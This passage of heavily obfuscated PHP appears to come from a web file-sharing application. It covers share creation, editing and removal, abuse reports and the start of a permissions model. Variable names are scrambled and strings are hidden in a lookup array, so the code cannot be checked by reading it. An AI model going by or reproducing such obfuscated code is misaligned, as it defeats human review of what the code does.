$êÛ‡”Å[2056])); if ($ß¼–‹³ç == $êÛ‡”Å[2104]) { $Øİ¾ûÏØ = array($êÛ‡”Å[571] => 1); } else { if ($ß¼–‹³ç == $êÛ‡”Å[1225]) { $Øİ¾ûÏØ = array($êÛ‡”Å[672] => 1); } } $Øİ¾ûÏØ[$êÛ‡”Å[1755]] = USER_ID; $‰ÛÍ¤è¼ = $this->where($Øİ¾ûÏØ)->selectPage($ù±Ñ¶êá); return $‰ÛÍ¤è¼; } protected function listToMe($Ïï°«ìÙ = 300) { $ê®á‡Âó =& $_SERVER[£ğ°ÖØø]; $½Æ”‡ªã = Model($ê®á‡Âó[2105])->userGroupParents(USER_ID); $©Úò‰éÃ = array($ê®á‡Âó[657] => SourceModel::TYPE_USER, $ê®á‡Âó[578] => USER_ID); if ($½Æ”‡ªã) { $©Úò‰éÃ = array(array($ê®á‡Âó[657] => SourceModel::TYPE_USER, $ê®á‡Âó[578] => USER_ID), array($ê®á‡Âó[657] => SourceModel::TYPE_GROUP, $ê®á‡Âó[578] => array($ê®á‡Âó[7], $½Æ”‡ªã)), $ê®á‡Âó[2103] => $ê®á‡Âó[2056]); } $±ÚéŞ¿‘ = Model($ê®á‡Âó[675])->where($©Úò‰éÃ)->selectPage($Ïï°«ìÙ); $ŞÅê¡»ğ = array_to_keyvalue_group($±ÚéŞ¿‘[$ê®á‡Âó[454]], $ê®á‡Âó[674]); if (!$ŞÅê¡»ğ) { return $±ÚéŞ¿‘; } $ÕÃÏí¨£ = $ê®á‡Âó[2106]; $©Úò‰éÃ = array($ê®á‡Âó[674] => array($ê®á‡Âó[501], array_keys($ŞÅê¡»ğ)), $ê®á‡Âó[1755] => array($ê®á‡Âó[1075], $ê®á‡Âó[228])); $Æü°¸éÇ = $this->field($ÕÃÏí¨£)->where($©Úò‰éÃ)->select(); foreach ($Æü°¸éÇ as $×ó—Ïâ” => &$Ûò¼§÷ü) { $Ûò¼§÷ü[$ê®á‡Âó[2102]] = $ŞÅê¡»ğ[$Ûò¼§÷ü[$ê®á‡Âó[674]]]; } unset($Ûò¼§÷ü); $ÉªÁ§òË = array($ê®á‡Âó[2107] => $Æü°¸éÇ, $ê®á‡Âó[2108] => $±ÚéŞ¿‘[$ê®á‡Âó[451]]); return $ÉªÁ§òË; } protected function shareAdd($Ÿ™á±º, $ÉÃšçÈ†) { $û¥üŒªß =& $_SERVER[£ğ°ÖØø]; $ë¦Ñ­øù = $this->_addShareData($Ÿ™á±º, $ÉÃšçÈ†); if (!empty($ÉÃšçÈ†[$û¥üŒªß[2109]])) { $this->_shareAuthSet($ë¦Ñ­øù, $ÉÃšçÈ†[$û¥üŒªß[2109]]); } $this->shareEventAdd($Ÿ™á±º, $ÉÃšçÈ†, $û¥üŒªß[2110]); return $ë¦Ñ­øù; } protected function shareAddSystem($ŒÆ™Á¥š, $´è±…ßŠ) { $¥¸Êş» =& $_SERVER[£ğ°ÖØø]; $„°Œª¤ù = $this->_addShareData($ŒÆ™Á¥š, $´è±…ßŠ, $¥¸Êş»[191]); $this->_shareAuthSet($„°Œª¤ù, $´è±…ßŠ[$¥¸Êş»[2109]]); return $„°Œª¤ù; } private function shareEventAdd($ò¯¿Ú, $ˆ¿“èÏ, $ÂÆåÌü« = "\x61\x64\x64") { $šÈ…½‚ù =& $_SERVER[£ğ°ÖØø]; if (!$ò¯¿Ú || $ò¯¿Ú == $šÈ…½‚ù[228]) { return; } if ($ÂÆåÌü« == $šÈ…½‚ù[2110]) { if ($ˆ¿“èÏ[$šÈ…½‚ù[571]] == $šÈ…½‚ù[91]) { Model($šÈ…½‚ù[642])->eventShare($ò¯¿Ú, $šÈ…½‚ù[2111]); } if ($ˆ¿“èÏ[$šÈ…½‚ù[672]] == $šÈ…½‚ù[91]) { Model($šÈ…½‚ù[642])->eventShare($ò¯¿Ú, $šÈ…½‚ù[2112]); } return; } $Ô…ã›Öä = $this->getInfoByPath($ò¯¿Ú); $æİ®‡÷Ó = $šÈ…½‚ù[2113]; if ($Ô…ã›Öä[$šÈ…½‚ù[571]] == $šÈ…½‚ù[228] && $ˆ¿“èÏ[$šÈ…½‚ù[571]] == $šÈ…½‚ù[91]) { $æİ®‡÷Ó = $šÈ…½‚ù[2111]; } if ($Ô…ã›Öä[$šÈ…½‚ù[571]] == $šÈ…½‚ù[91] && $ˆ¿“èÏ[$šÈ…½‚ù[571]] == $šÈ…½‚ù[228]) { $æİ®‡÷Ó = $šÈ…½‚ù[2114]; } if ($Ô…ã›Öä[$šÈ…½‚ù[672]] == $šÈ…½‚ù[228] && $ˆ¿“èÏ[$šÈ…½‚ù[672]] == $šÈ…½‚ù[91]) { $æİ®‡÷Ó = $šÈ…½‚ù[2112]; } if ($Ô…ã›Öä[$šÈ…½‚ù[672]] == $šÈ…½‚ù[91] && $ˆ¿“èÏ[$šÈ…½‚ù[672]] == $šÈ…½‚ù[228]) { $æİ®‡÷Ó = $šÈ…½‚ù[2115]; } Model($šÈ…½‚ù[642])->eventShare($ò¯¿Ú, $æİ®‡÷Ó); return; } private function _addShareData($·ÏŸÛş¨, $Äê §ª = array(), $ÛÆÒ²‡Ñ = false) { $ìíÃéÉ =& $_SERVER[£ğ°ÖØø]; $œÆ³Õƒñ = $ÛÆÒ²‡Ñ == $ìíÃéÉ[191] ? 0 : USER_ID; $”ÉÒÓ‡ = array($ìíÃéÉ[500] => $·ÏŸÛş¨, $ìíÃéÉ[1746] => $œÆ³Õƒñ); if ($·ÏŸÛş¨ == 0) { $”ÉÒÓ‡ = array($ìíÃéÉ[2116] => $Äê §ª[$ìíÃéÉ[1240]], $ìíÃéÉ[1746] => $œÆ³Õƒñ); } if ($¢ëÈ¾Ú = $this->where($”ÉÒÓ‡)->find()) { return $¢ëÈ¾Ú[$ìíÃéÉ[674]]; } if ($·ÏŸÛş¨ == 0) { $“»»¹„Ş = array($ìíÃéÉ[32] => get_path_this($Äê §ª[$ìíÃéÉ[87]])); } else { $“»»¹„Ş = Model($ìíÃéÉ[888])->sourceInfo($·ÏŸÛş¨); if (!$“»»¹„Ş) { return !1; } } if (!$Äê §ª[$ìíÃéÉ[1642]]) { $Äê §ª[$ìíÃéÉ[1642]] = $“»»¹„Ş[$ìíÃéÉ[32]]; } $Ëìô¢èû = array($ìíÃéÉ[1746] => $œÆ³Õƒñ, $ìíÃéÉ[500] => $·ÏŸÛş¨, $ìíÃéÉ[1642] => $ìíÃéÉ[12], $ìíÃéÉ[571] => 0, $ìíÃéÉ[672] => 0, $ìíÃéÉ[1240] => $ìíÃéÉ[12], $ìíÃéÉ[383] => $ìíÃéÉ[12], $ìíÃéÉ[950] => $ìíÃéÉ[12], $ìíÃéÉ[2117] => 0, $ìíÃéÉ[2118] => 0, $ìíÃéÉ[825] => 0, $ìíÃéÉ[2119] => $ìíÃéÉ[12], $ìíÃéÉ[2100] => $ìíÃéÉ[12]); $æÊª¿¥ù = explode($ìíÃéÉ[50], $ìíÃéÉ[2120]); foreach ($æÊª¿¥ù as $¢õØ”÷) { if (!isset($Äê §ª[$¢õØ”÷])) { continue; } $Ëìô¢èû[$¢õØ”÷] = $Äê §ª[$¢õØ”÷]; } $ç”¥°é¤ = $this->add($Ëìô¢èû); $¿ñŞƒ´· = array($ìíÃéÉ[2100] => short_id($ç”¥°é¤)); $this->where(array($ìíÃéÉ[2121] => $ç”¥°é¤))->save($¿ñŞƒ´·); return $ç”¥°é¤; } private function _shareAuthSet($Õ™ğüô, $Õ­ŸÅ® ) { $Œ•¹ĞŒ =& $_SERVER[£ğ°ÖØø]; if (!is_array($Õ­ŸÅ® )) { return !1; } $„âŞËä = Model($Œ•¹ĞŒ[2066]); $„âŞËä->where(array($Œ•¹ĞŒ[674] => $Õ™ğüô))->delete(); $ÓÊÉ¦’± = array(); foreach ($Õ­ŸÅ®  as $’‡Ïâ¯›) { $Áƒëü«ş = SourceModel::TYPE_USER; if ($’‡Ïâ¯›[$Œ•¹ĞŒ[190]] == SourceModel::TYPE_GROUP) { $Áƒëü«ş = SourceModel::TYPE_GROUP; } $ôÑ©©Üƒ = array($Œ•¹ĞŒ[674] => $Õ™ğüô, $Œ•¹ĞŒ[190] => $Áƒëü«ş, $Œ•¹ĞŒ[578] => intval($’‡Ïâ¯›[$Œ•¹ĞŒ[578]]), $Œ•¹ĞŒ[2062] => 0, $Œ•¹ĞŒ[2122] => -1); if ($’‡Ïâ¯›[$Œ•¹ĞŒ[2062]]) { $ôÑ©©Üƒ[$Œ•¹ĞŒ[2062]] = $’‡Ïâ¯›[$Œ•¹ĞŒ[2062]]; } else { if ($’‡Ïâ¯›[$Œ•¹ĞŒ[2122]]) { $ôÑ©©Üƒ[$Œ•¹ĞŒ[2122]] = $’‡Ïâ¯›[$Œ•¹ĞŒ[2122]]; } } $ÓÊÉ¦’±[] = $ôÑ©©Üƒ; } return $„âŞËä->addAll($ÓÊÉ¦’±, array(), !0); } public function numViewAdd($û™ÆÀ“…) { $ªèñ´‘¦ =& $_SERVER[£ğ°ÖØø]; $è¸«¿ıÙ = array($ªèñ´‘¦[2121] => $û™ÆÀ“…); $this->where($è¸«¿ıÙ)->setAdd($ªèñ´‘¦[2117]); } public function numDownloadAdd($ÔÉ‡‹†) { $àÏèÈ–µ =& $_SERVER[£ğ°ÖØø]; $¹¡æŒ = array($àÏèÈ–µ[2121] => $ÔÉ‡‹†); $this->where($¹¡æŒ)->setAdd($àÏèÈ–µ[2118]); } protected function shareEdit($æ´·àü­, $á»Üƒìû) { $•›øŠ“Œ =& $_SERVER[£ğ°ÖØø]; $óßÂÄ¦¡ = $this->getInfo($æ´·àü­); if (!$óßÂÄ¦¡) { return !1; } $this->_checkLinkShare($á»Üƒìû, $óßÂÄ¦¡); $èş®òçı = array(); $ÎîÔÔÃÒ = explode($•›øŠ“Œ[50], $•›øŠ“Œ[2123]); foreach ($ÎîÔÔÃÒ as $ÁÏÌ²§Ÿ) { if (!array_key_exists($ÁÏÌ²§Ÿ, $á»Üƒìû)) { continue; } $èş®òçı[$ÁÏÌ²§Ÿ] = $á»Üƒìû[$ÁÏÌ²§Ÿ]; } $this->shareEventAdd($óßÂÄ¦¡[$•›øŠ“Œ[193]], $á»Üƒìû, $•›øŠ“Œ[1923]); $this->where(array($•›øŠ“Œ[2121] => $æ´·àü­))->save($èş®òçı); if (isset($á»Üƒìû[$•›øŠ“Œ[2109]])) { $this->_shareAuthSet($æ´·àü­, $á»Üƒìû[$•›øŠ“Œ[2109]]); } return !0; } private function _checkLinkShare($“Ê¨×î”, $’µÔ‰–ğ) { $îã¾¶ö =& $_SERVER[£ğ°ÖØø]; if ($“Ê¨×î”[$îã¾¶ö[571]] != $îã¾¶ö[91]) { return; } $îƒì‡Ï = $’µÔ‰–ğ[$îã¾¶ö[90]][$îã¾¶ö[193]]; if ($’µÔ‰–ğ[$îã¾¶ö[90]][$îã¾¶ö[33]] != $îã¾¶ö[230]) { $ê…·šØµ = $this->_folderReport($îƒì‡Ï); if (!$ê…·šØµ) { return; } show_json(LNG($îã¾¶ö[2124]) . $îã¾¶ö[2125] . $ê…·šØµ, !1); } $íº¡§£ = Model($îã¾¶ö[888])->fileInfoGet($’µÔ‰–ğ[$îã¾¶ö[90]][$îã¾¶ö[193]]); if (!$íº¡§£) { return; } $¶ú¤§áÁ = $this->shareFileMeta($íº¡§£[$îã¾¶ö[550]]); if (isset($¶ú¤§áÁ[$îã¾¶ö[459]]) && $¶ú¤§áÁ[$îã¾¶ö[459]] == $îã¾¶ö[91]) { show_json(LNG($îã¾¶ö[2126]), !1); } } private function _folderReport($™»æè´Ú) { $Ü½ŒÒ×Î =& $_SERVER[£ğ°ÖØø]; $­µÚ’×– = array($Ü½ŒÒ×Î[550] => array($Ü½ŒÒ×Î[1073], 0), $Ü½ŒÒ×Î[814] => 3); $ÚÎöôÈ = Model($Ü½ŒÒ×Î[2127])->where($­µÚ’×–)->field($Ü½ŒÒ×Î[550])->select(); if (!$ÚÎöôÈ) { return !1; } $ÚÎöôÈ = array_to_keyvalue($ÚÎöôÈ, $Ü½ŒÒ×Î[12], $Ü½ŒÒ×Î[550]); $Õ¤Ô’øÏ = $Ü½ŒÒ×Î[50] . $™»æè´Ú . $Ü½ŒÒ×Î[50]; $­µÚ’×– = array($Ü½ŒÒ×Î[550] => array($Ü½ŒÒ×Î[7], $ÚÎöôÈ), $Ü½ŒÒ×Î[593] => array($Ü½ŒÒ×Î[468], "\45{$Õ¤Ô’øÏ}\x25"), $Ü½ŒÒ×Î[514] => 0); $ìéÙŸÎ’ = Model($Ü½ŒÒ×Î[888])->where($­µÚ’×–)->field($Ü½ŒÒ×Î[2128])->find(); if (!$ìéÙŸÎ’) { return !1; } $“œÇšÂü = substr($ìéÙŸÎ’[$Ü½ŒÒ×Î[593]], strpos($ìéÙŸÎ’[$Ü½ŒÒ×Î[593]], $Õ¤Ô’øÏ)); $­µÚ’×– = array($Ü½ŒÒ×Î[193] => array($Ü½ŒÒ×Î[7], trim($“œÇšÂü, $Ü½ŒÒ×Î[50]))); $Âîõ€À¢ = Model($Ü½ŒÒ×Î[888])->where($­µÚ’×–)->field($Ü½ŒÒ×Î[32])->select(); $’¡°¡Æ = array_to_keyvalue($Âîõ€À¢, $Ü½ŒÒ×Î[12], $Ü½ŒÒ×Î[32]); $’¡°¡Æ[] = $ìéÙŸÎ’[$Ü½ŒÒ×Î[32]]; return implode($Ü½ŒÒ×Î[8], $’¡°¡Æ); } protected function remove($ñ‡ˆ“³®) { $¥ìë¼–À =& $_SERVER[£ğ°ÖØø]; $åÙû†„š = is_array($ñ‡ˆ“³®) ? $ñ‡ˆ“³® : array($ñ‡ˆ“³®); for ($‘‡»ç… = 0; $‘‡»ç… < count($åÙû†„š); $‘‡»ç…++) { $“àÃÛœ = $this->getInfo($åÙû†„š[$‘‡»ç…]); if ($“àÃÛœ[$¥ìë¼–À[672]] == $¥ìë¼–À[91]) { Model($¥ìë¼–À[642])->eventShare($“àÃÛœ[$¥ìë¼–À[193]], $¥ìë¼–À[2115]); } if ($“àÃÛœ[$¥ìë¼–À[571]] == $¥ìë¼–À[91]) { Model($¥ìë¼–À[642])->eventShare($“àÃÛœ[$¥ìë¼–À[193]], $¥ìë¼–À[2114]); } } if (is_array($ñ‡ˆ“³®)) { $ñ‡ˆ“³® = array($¥ìë¼–À[7], $ñ‡ˆ“³®); } $‡ÌØ… = array($¥ìë¼–À[674] => $ñ‡ˆ“³®); $ª­±¶ä = $this->where($‡ÌØ…)->delete(); if ($ª­±¶ä) { Model($¥ìë¼–À[675])->where(array($¥ìë¼–À[674] => $ñ‡ˆ“³®))->delete(); } return $ª­±¶ä; } protected function removeBySource($ÉŞŸ”Öê) { $½´’Ş– =& $_SERVER[£ğ°ÖØø]; $§ŸËÎ®Š = array($½´’Ş–[500] => array($½´’Ş–[501], $ÉŞŸ”Öê)); $¿ìºô°“ = $this->field($½´’Ş–[674])->where($§ŸËÎ®Š)->select(); $¿ìºô°“ = array_to_keyvalue($¿ìºô°“, $½´’Ş–[12], $½´’Ş–[674]); if (!$¿ìºô°“) { return; } $§ŸËÎ®Š = array($½´’Ş–[2121] => array($½´’Ş–[501], $¿ìºô°“)); $this->where($§ŸËÎ®Š)->delete(); Model($½´’Ş–[675])->where($§ŸËÎ®Š)->delete(); } public function listAll($†¾”³®ã) { $ÅÁé¨äí =& $_SERVER[£ğ°ÖØø]; $±ßƒÇÈƒ = array(); if ($†¾”³®ã[$ÅÁé¨äí[1755]]) { $±ßƒÇÈƒ[$ÅÁé¨äí[1755]] = $†¾”³®ã[$ÅÁé¨äí[1755]]; } if ($†¾”³®ã[$ÅÁé¨äí[824]]) { $Õ´’•¢ = $†¾”³®ã[$ÅÁé¨äí[825]] ? $†¾”³®ã[$ÅÁé¨äí[825]] : strtotime(date($ÅÁé¨äí[2129])); $±ßƒÇÈƒ[$ÅÁé¨äí[231]] = array($ÅÁé¨äí[409], array($†¾”³®ã[$ÅÁé¨äí[824]], $Õ´’•¢)); } if ($†¾”³®ã[$ÅÁé¨äí[33]]) { $±ßƒÇÈƒ[$†¾”³®ã[$ÅÁé¨äí[33]]] = 1; } else { $±ßƒÇÈƒ[] = array($ÅÁé¨äí[571] => array($ÅÁé¨äí[1073], 0), $ÅÁé¨äí[672] => array($ÅÁé¨äí[1073], 0), $ÅÁé¨äí[2103] => $ÅÁé¨äí[2056]); } if ($†¾”³®ã[$ÅÁé¨äí[2052]]) { $±ßƒÇÈƒ[] = array($ÅÁé¨äí[2100] => $†¾”³®ã[$ÅÁé¨äí[2052]], $ÅÁé¨äí[1642] => array($ÅÁé¨äí[468], "\45{$†¾”³®ã[$ÅÁé¨äí[2052]]}\x25"), $ÅÁé¨äí[2103] => $ÅÁé¨äí[2056]); } $§³¿ÖäÁ = $this->_makeOrder()->where($±ßƒÇÈƒ)->selectPage(20); if (empty($§³¿ÖäÁ[$ÅÁé¨äí[454]])) { return array(); } $this->_listDataApply($§³¿ÖäÁ[$ÅÁé¨äí[454]]); return $§³¿ÖäÁ; } public function listDataApply($³õ‚š) { $this->_listDataApply($³õ‚š); return $³õ‚š; } private function _listDataApply(&$õÕ°û¾û) { $şéÛè´ =& $_SERVER[£ğ°ÖØø]; $”¢—¿¡Í = array_to_keyvalue($õÕ°û¾û, $şéÛè´[12], $şéÛè´[1755]); $ªÃº  = Model($şéÛè´[607])->userListInfo(array_unique($”¢—¿¡Í)); $¿ÄÆÉå® = array_to_keyvalue($õÕ°û¾û, $şéÛè´[12], $şéÛè´[193]); $ÅÏ·«Ö÷ = Model($şéÛè´[888])->sourceListInfo($¿ÄÆÉå®, !0); foreach ($õÕ°û¾û as $ÔÒ½áñ => &$•™©ÁÙß) { $¶–ŸÈËõ = $•™©ÁÙß[$şéÛè´[1755]]; $•™©ÁÙß[$şéÛè´[2130]] = $ªÃº [$¶–ŸÈËõ] ? $ªÃº [$¶–ŸÈËõ] : !1; $«à£ëÚ = $•™©ÁÙß[$şéÛè´[193]]; $•™©ÁÙß[$şéÛè´[90]] = $ÅÏ·«Ö÷[$«à£ëÚ] ? $ÅÏ·«Ö÷[$«à£ëÚ] : !1; if ($•™©ÁÙß[$şéÛè´[90]][$şéÛè´[514]] == $şéÛè´[91]) { unset($õÕ°û¾û[$ÔÒ½áñ]); } if ($•™©ÁÙß[$şéÛè´[90]] != $şéÛè´[228] && !$•™©ÁÙß[$şéÛè´[90]]) { unset($õÕ°û¾û[$ÔÒ½áñ]); } } unset($•™©ÁÙß); $õÕ°û¾û = array_values($õÕ°û¾û); } private function _makeOrder($¦‹ƒ‘Ÿ£ = '') { $²ªí‹¤± =& $_SERVER[£ğ°ÖØø]; $Ô®“ûì = array($²ªí‹¤±[231], $²ªí‹¤±[825], $²ªí‹¤±[2117], $²ªí‹¤±[2118]); $úÇ ÄÊù = array($²ªí‹¤±[532] => $²ªí‹¤±[533], $²ªí‹¤±[534] => $²ªí‹¤±[535]); $ç÷çğÂÏ = Input::get($²ªí‹¤±[539], $²ªí‹¤±[7], $²ªí‹¤±[506], $Ô®“ûì); $š”ß¡€İ = Input::get($²ªí‹¤±[540], $²ªí‹¤±[7], $²ªí‹¤±[2131], array($²ªí‹¤±[2049], $²ªí‹¤±[534])); $š”ß¡€İ = $úÇ ÄÊù[$š”ß¡€İ]; $¦‹ƒ‘Ÿ£ = $¦‹ƒ‘Ÿ£ . "{$ç÷çğÂÏ}\40{$š”ß¡€İ}"; return $this->order($¦‹ƒ‘Ÿ£); } public function reportAdd($áÆ©àäò) { $„¸æÀ”ö =& $_SERVER[£ğ°ÖØø]; $Š÷ŸÈ‹» = array($„¸æÀ”ö[674] => $áÆ©àäò[$„¸æÀ”ö[674]], $„¸æÀ”ö[1755] => USER_ID); if (Model($„¸æÀ”ö[2127])->where($Š÷ŸÈ‹»)->find()) { return !1; } $¨¦½°“ = array($„¸æÀ”ö[674] => $áÆ©àäò[$„¸æÀ”ö[674]], $„¸æÀ”ö[1642] => $áÆ©àäò[$„¸æÀ”ö[1642]], $„¸æÀ”ö[193] => $áÆ©àäò[$„¸æÀ”ö[193]], $„¸æÀ”ö[550] => $áÆ©àäò[$„¸æÀ”ö[550]], $„¸æÀ”ö[1755] => USER_ID, $„¸æÀ”ö[33] => $áÆ©àäò[$„¸æÀ”ö[33]], $„¸æÀ”ö[535] => $áÆ©àäò[$„¸æÀ”ö[535]]); return Model($„¸æÀ”ö[2127])->add($¨¦½°“); } public function reportList($†«ß®¨) { $í™‘Ãé× =& $_SERVER[£ğ°ÖØø]; $•“ÖÀğã = array(); if ($†«ß®¨[$í™‘Ãé×[824]]) { $í˜ş¹ª¡ = $†«ß®¨[$í™‘Ãé×[825]] ? $†«ß®¨[$í™‘Ãé×[825]] : strtotime(date($í™‘Ãé×[2129])); $•“ÖÀğã[$í™‘Ãé×[231]] = array($í™‘Ãé×[409], array($†«ß®¨[$í™‘Ãé×[824]], $í˜ş¹ª¡)); } if (isset($†«ß®¨[$í™‘Ãé×[33]]) && in_array($†«ß®¨[$í™‘Ãé×[33]], array($í™‘Ãé×[91], $í™‘Ãé×[519], $í™‘Ãé×[2132], $í™‘Ãé×[2133], $í™‘Ãé×[2134]))) { $•“ÖÀğã[$í™‘Ãé×[33]] = $†«ß®¨[$í™‘Ãé×[33]]; } if (isset($†«ß®¨[$í™‘Ãé×[814]]) && in_array($†«ß®¨[$í™‘Ãé×[814]], array($í™‘Ãé×[228], $í™‘Ãé×[91], $í™‘Ãé×[519], $í™‘Ãé×[2132]))) { $•“ÖÀğã[$í™‘Ãé×[814]] = $†«ß®¨[$í™‘Ãé×[814]]; } $ÖîÁõ‹È = Input::get($í™‘Ãé×[540], $í™‘Ãé×[7], $í™‘Ãé×[2131], array($í™‘Ãé×[2049], $í™‘Ãé×[534])); $Î½·‡ = array($í™‘Ãé×[532] => $í™‘Ãé×[533], $í™‘Ãé×[534] => $í™‘Ãé×[535]); $• Ú‚úÑ = $í™‘Ãé×[2135] . $Î½·‡[$ÖîÁõ‹È]; $÷ª•Ç = Model($í™‘Ãé×[2127])->where($•“ÖÀğã)->order($• Ú‚úÑ)->selectPage(20); if (empty($÷ª•Ç[$í™‘Ãé×[454]])) { return array(); } $éƒ ½ç¢ = array_to_keyvalue_group($÷ª•Ç[$í™‘Ãé×[454]], $í™‘Ãé×[814], $í™‘Ãé×[674]); if (!empty($éƒ ½ç¢[0])) { $†«ß®¨ = $éƒ ½ç¢[0]; $•“ÖÀğã = array($í™‘Ãé×[674] => array($í™‘Ãé×[7], $†«ß®¨)); $¹±³ôä = $this->where($•“ÖÀğã)->field($í™‘Ãé×[674])->select(); $¹±³ôä = array_to_keyvalue($¹±³ôä, $í™‘Ãé×[12], $í™‘Ãé×[674]); $ÃŞôôÑ˜ = array_diff($†«ß®¨, $¹±³ôä); if (!empty($ÃŞôôÑ˜)) { foreach ($÷ª•Ç[$í™‘Ãé×[454]] as $šµ¦ø¼ê => $ä¦ä¶Ö) { if (in_array($ä¦ä¶Ö[$í™‘Ãé×[674]], $ÃŞôôÑ˜)) { unset($÷ª•Ç[$í™‘Ãé×[454]][$šµ¦ø¼ê]); } } } } $this->_listDataApply($÷ª•Ç[$í™‘Ãé×[454]]); return $÷ª•Ç; } public function reportStatus($¼¶Êı—) { $‚Ü¦ƒ‡ã =& $_SERVER[£ğ°ÖØø]; $ê²¯“ı = array($‚Ü¦ƒ‡ã[484] => $¼¶Êı—[$‚Ü¦ƒ‡ã[484]]); $–ğ•ÇÜì = Model($‚Ü¦ƒ‡ã[2127])->where($ê²¯“ı)->field($‚Ü¦ƒ‡ã[2136])->find(); if (!$–ğ•ÇÜì) { return !1; } $¢ÍÇº¬Ì = array($‚Ü¦ƒ‡ã[814] => $¼¶Êı—[$‚Ü¦ƒ‡ã[814]]); if ($¼¶Êı—[$‚Ü¦ƒ‡ã[814]] == $‚Ü¦ƒ‡ã[2132] && $–ğ•ÇÜì[$‚Ü¦ƒ‡ã[814]] == $‚Ü¦ƒ‡ã[2132]) { $¢ÍÇº¬Ì[$‚Ü¦ƒ‡ã[814]] = 0; } $›ª³ñÓÅ = Model($‚Ü¦ƒ‡ã[2127])->where($ê²¯“ı)->save($¢ÍÇº¬Ì); if ($¼¶Êı—[$‚Ü¦ƒ‡ã[814]] == $‚Ü¦ƒ‡ã[519]) { if ($–ğ•ÇÜì[$‚Ü¦ƒ‡ã[550]] != $‚Ü¦ƒ‡ã[228] && $this->shareFileMeta($–ğ•ÇÜì[$‚Ü¦ƒ‡ã[550]])) { $this->shareFileMeta($–ğ•ÇÜì[$‚Ü¦ƒ‡ã[550]], 0); } $this->remove($–ğ•ÇÜì[$‚Ü¦ƒ‡ã[674]]); return !0; } if ($›ª³ñÓÅ && $¼¶Êı—[$‚Ü¦ƒ‡ã[814]] == $‚Ü¦ƒ‡ã[2132]) { $Ûøµ»øõ = $¢ÍÇº¬Ì[$‚Ü¦ƒ‡ã[814]] == $‚Ü¦ƒ‡ã[2132] ? 1 : 0; $this->shareFileMeta($–ğ•ÇÜì[$‚Ü¦ƒ‡ã[550]], $Ûøµ»øõ); $this->removeByFile($–ğ•ÇÜì[$‚Ü¦ƒ‡ã[550]]); } return $›ª³ñÓÅ; } private function removeByFile($Ò±ÈîÙ¸) { $ÀÙÀğÏ =& $_SERVER[£ğ°ÖØø]; $ãè’å³Ü = Model($ÀÙÀğÏ[888])->where(array($ÀÙÀğÏ[550] => $Ò±ÈîÙ¸))->field($ÀÙÀğÏ[193])->select(); $¯¬¡’˜ = array_to_keyvalue($ãè’å³Ü, $ÀÙÀğÏ[12], $ÀÙÀğÏ[193]); $œ»ßÁ¥¨ = array($ÀÙÀğÏ[193] => array($ÀÙÀğÏ[7], $¯¬¡’˜), $ÀÙÀğÏ[571] => 1); $ãè’å³Ü = $this->where($œ»ßÁ¥¨)->field($ÀÙÀğÏ[674])->select(); if (empty($ãè’å³Ü)) { return; } $Ãåè“×ç = array_to_keyvalue($ãè’å³Ü, $ÀÙÀğÏ[12], $ÀÙÀğÏ[674]); $this->remove($Ãåè“×ç); } private function shareFileMeta($ïèË¦ÛÉ, $Úï¦ğ = null) { $µô¡ñ =& $_SERVER[£ğ°ÖØø]; $øõ²ŞÌÓ = array($µô¡ñ[550] => $ïèË¦ÛÉ, $µô¡ñ[97] => $µô¡ñ[2137]); if (is_null($Úï¦ğ)) { return Model($µô¡ñ[2138])->where($øõ²ŞÌÓ)->find(); } $øõ²ŞÌÓ[$µô¡ñ[459]] = $Úï¦ğ; Model($µô¡ñ[2138])->add($øõ²ŞÌÓ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\162\x63\145\x5f\x61\x75\164\x68"; public function getAuth($Ñ¨Ÿôğ) { $ÈÁñ©Í­ =& $_SERVER[£ğ°ÖØø]; $¡äÄŞ‰ = $this->sourceAuthSelect($Ñ¨Ÿôğ); $§Â‰”ğ© = array(); $ŠßÙ“šØ = array(); $÷·¾¢Í´ = 2 << 25; foreach ($¡äÄŞ‰ as $Ââ¦”í¬) { $Š©ôÙå¶ = Model($ÈÁñ©Í­[580])->listData($Ââ¦”í¬[$ÈÁñ©Í­[2062]]); if (!$Š©ôÙå¶) { continue; } $§Â‰”ğ©[] = $Ââ¦”í¬; $ÁıŒëºÁ = 0; if ($Ââ¦”í¬[$ÈÁñ©Í­[190]] == SourceModel::TYPE_GROUP) { $ÁıŒëºÁ = $÷·¾¢Í´ * 2; } if ($Ââ¦”í¬[$ÈÁñ©Í­[190]] == SourceModel::TYPE_USER) { $ÁıŒëºÁ = $÷·¾¢Í´; } if ($Ââ¦”í¬[$ÈÁñ©Í­[190]] == SourceModel::TYPE_USER && $Ââ¦”í¬[$ÈÁñ©Í­[578]] == $ÈÁñ©Í­[228]) { $ÁıŒëºÁ = 0; } $ŠßÙ“šØ[] = $Š©ôÙå¶[$ÈÁñ©Í­[496]] + $ÁıŒëºÁ; } array_multisort($ŠßÙ“šØ, SORT_DESC, $§Â‰”ğ©); return $§Â‰”ğ©; } public function sourceAuthSelect($Óòßâº) { $œ¿É¼ÊÔ =& $_SERVER[£ğ°ÖØø]; static $¥ËËÌŠÌ = array(); $û²¼ˆŞ = is_array($Óòßâº) ? !1 : !0; if ($û²¼ˆŞ) { $Óòßâº = array($Óòßâº); } $¥›€ª£ = array(); foreach ($Óòßâº as $Ïš±Ñ×ª) { if (isset($¥ËËÌŠÌ[$Ïš±Ñ×ª])) { $¥›€ª£[$Ïš±Ñ×ª] = $¥ËËÌŠÌ[$Ïš±Ñ×ª]; } } if (count($¥›€ª£) == count($Óòßâº)) { return $û²¼ˆŞ ? $¥›€ª£[$Óòßâº[0]] : $¥›€ª£; } $Â¿Ç¢Û = $œ¿É¼ÊÔ[2139]; $ŞŞÕŞ£¾ = array($œ¿É¼ÊÔ[193] => array($œ¿É¼ÊÔ[7], $Óòßâº)); $ƒ‡§ì = $this->field($Â¿Ç¢Û)->order($œ¿É¼ÊÔ[484])->where($ŞŞÕŞ£¾)->select(); $úú¯ª‰í = array_to_keyvalue_group($ƒ‡§ì, $œ¿É¼ÊÔ[193]); foreach ($Óòßâº as $Ïš±Ñ×ª) { $¥ËËÌŠÌ[$Ïš±Ñ×ª] = $úú¯ª‰í[$Ïš±Ñ×ª] ? $úú¯ª‰í[$Ïš±Ñ×ª] : array(); } if ($û²¼ˆŞ) { return $ƒ‡§ì; } return $úú¯ª‰í; } public function setAuth($Ñïæ, $ñ˜Üêôû) { $ÍşÊƒÀõ =& $_SERVER[£ğ°ÖØø]; $åŠÓ¼ã½ = Model($ÍşÊƒÀõ[1401])->sourceInfo($Ñïæ); if (!$åŠÓ¼ã½) { return !1; } if ($åŠÓ¼ã½[$ÍşÊƒÀõ[190]] 